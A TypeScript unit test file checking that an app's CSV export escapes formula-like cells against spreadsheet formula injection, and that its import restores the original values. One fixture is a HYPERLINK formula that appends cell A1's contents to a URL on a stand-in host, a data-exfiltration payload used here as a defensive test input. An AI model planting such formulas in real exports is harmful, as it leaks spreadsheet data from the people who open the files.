import assert from 'node:assert/strict';
import Module from 'node:module';
import { describe, it } from 'node:test';
import Papa from 'papaparse';

import type { ItemExportData } from '@/lib/types/item-import-export';

/**
 * Run with: `pnpm --filter @ever-works/web test:unit`
 *
 * Item CSV exports carry client-submitted text (name, description, brand, markdown, location).
 * A cell that begins with `=`, `+`, `-`, `@`, tab, CR or LF can run as a formula when an admin opens
 * the file in a spreadsheet app, so `ItemExportService.exportToCSV` must prefix such cells with
 * `'`, and `ItemImportService.parseCSV` must take that one apostrophe off again so an
 * export-then-import round trip does not change any value.
 *
 * Both services import `ItemRepository`, which reaches `server-only` through the config
 * service and throws on import outside a Next server context. The module graph is CommonJS
 * under `tsx --test`, so the repository module is replaced through `Module._load` and each
 * service gets a fake repository through its constructor.
 */
const loader = Module as unknown as { _load: (request: string, ...rest: unknown[]) => unknown };
const originalLoad = loader._load;
const stubs: Record<string, unknown> = {
	'@/lib/repositories/item.repository': { ItemRepository: class {} }
};
loader._load = function (this: unknown, request: string, ...rest: unknown[]) {
	if (Object.prototype.hasOwnProperty.call(stubs, request)) return stubs[request];
	return originalLoad.call(this, request, ...rest);
};
const { ItemExportService } = require('../item-export.service') as typeof import('../item-export.service');
const { ItemImportService } = require('../item-import.service') as typeof import('../item-import.service');
loader._load = originalLoad;

type Repository = NonNullable<ConstructorParameters<typeof ItemExportService>[0]>;

const MULTILINE_FORMULA = '=HYPERLINK("https://example.com/?d="&A1,"Open")\nSee the docs for details.';

const ITEM: ItemExportData = {
	id: 'item_1',
	name: '=1+1',
	slug: 'formula-item',
	description: MULTILINE_FORMULA,
	source_url: 'https://example.com',
	category: 'Productivity',
	tags: ['tools'],
	updated_at: '2026-11-16T00:00:00.000Z',
	status: 'approved',
	brand: '+1+1',
	markdown: '@SUM(1,1)',
	location: {
		address: "'=1+1",
		city: '-2+3',
		state: '\t=1+1',
		country: '\r=1+1',
		postal_code: '\n=1+1',
		latitude: -33.8688,
		longitude: 151.2093
	}
};

const fakeRepository = (items: ItemExportData[]) => ({ findAllRaw: async () => items }) as unknown as Repository;

/** Every cell of the CSV as the spreadsheet app sees it, header row first. */
const cells = (csv: string) => Papa.parse<string[]>(csv, { header: false }).data;

/** The data row of a one-item export, keyed by column. */
const firstRow = (csv: string) => Papa.parse<Record<string, string>>(csv, { header: true }).data[0];

/** A cell a spreadsheet app would run as a formula. Plain numbers such as `-33.8688` are data. */
const isFormulaCell = (cell: string) => /^[=+\-@\t\r\n]/.test(cell) && !/^[-+]?\d+(\.\d+)?$/.test(cell);

for (const [label, options] of [
	['admin export (all items)', {}],
	['public export (approved items)', { publicOnly: true }]
] as const) {
	describe(`ItemExportService.exportToCSV escapes formula cells: ${label}`, () => {
		it(`writes the name '=1+1' as "'=1+1" and leaves no formula cell`, async () => {
			const { data } = await new ItemExportService(fakeRepository([ITEM])).exportToCSV(options);

			assert.ok(data.includes(`"'=1+1"`), `the name is not escaped:\n${data}`);
			const formulaCells = cells(data)
				.flat()
				.filter((cell) => isFormulaCell(cell));
			assert.deepEqual(formulaCells, [], `unescaped formula cells:\n${data}`);
		});

		it('escapes a multi-line description, the +, @, -, tab, CR and LF prefixes, and a value that already starts with an apostrophe', async () => {
			const { data } = await new ItemExportService(fakeRepository([ITEM])).exportToCSV(options);
			const row = firstRow(data);

			assert.equal(row.description, `'${MULTILINE_FORMULA}`);
			assert.equal(row.brand, "'+1+1");
			assert.equal(row.markdown, "'@SUM(1,1)");
			assert.equal(row['location.city'], "'-2+3");
			assert.equal(row['location.state'], "'\t=1+1");
			assert.equal(row['location.country'], "'\r=1+1");
			assert.equal(row['location.postal_code'], "'\n=1+1");
			assert.equal(row['location.address'], "''=1+1");
		});

		it('CONTROL: leaves plain numbers such as a negative latitude unescaped', async () => {
			const { data } = await new ItemExportService(fakeRepository([ITEM])).exportToCSV(options);
			const row = firstRow(data);

			assert.equal(row['location.latitude'], '-33.8688');
			assert.equal(row['location.longitude'], '151.2093');
		});
	});
}

describe('ItemImportService.parseCSV reads an escaped export back unchanged', () => {
	it(`returns the name '=1+1' and every other escaped value without the apostrophe`, async () => {
		const { data } = await new ItemExportService(fakeRepository([ITEM])).exportToCSV();
		const { rows } = new ItemImportService(fakeRepository([])).parseCSV(data);

		assert.equal(rows.length, 1);
		assert.equal(rows[0].name, '=1+1');
		assert.equal(rows[0].description, MULTILINE_FORMULA);
		assert.equal(rows[0].brand, '+1+1');
		assert.equal(rows[0].markdown, '@SUM(1,1)');
		assert.equal(rows[0]['location.city'], '-2+3');
		assert.equal(rows[0]['location.state'], '\t=1+1');
		assert.equal(rows[0]['location.country'], '\r=1+1');
		assert.equal(rows[0]['location.postal_code'], '\n=1+1');
		assert.equal(rows[0]['location.address'], "'=1+1");
		assert.equal(rows[0]['location.latitude'], '-33.8688');
	});

	it('removes the one apostrophe placed before =, +, -, @, tab, CR or LF', () => {
		const csv = [
			'name,description,brand,markdown,slug,tags,category,images',
			`'=1+1,'+1+1,'-2+3,"'@SUM(1,1)","'\tindented","'\rreturn",''=1+1,"'\nnewline"`
		].join('\n');
		const { rows } = new ItemImportService(fakeRepository([])).parseCSV(csv);

		assert.deepEqual(rows[0], {
			name: '=1+1',
			description: '+1+1',
			brand: '-2+3',
			markdown: '@SUM(1,1)',
			slug: '\tindented',
			tags: '\rreturn',
			category: "'=1+1",
			images: '\nnewline'
		});
	});

	it('CONTROL: keeps an apostrophe that is not followed by a formula character', () => {
		const csv = "name,description,brand\n'Quoted name,It's a tool that does things.,''1+1\n";
		const { rows } = new ItemImportService(fakeRepository([])).parseCSV(csv);

		assert.equal(rows[0].name, "'Quoted name");
		assert.equal(rows[0].description, "It's a tool that does things.");
		assert.equal(rows[0].brand, "''1+1");
	});
});
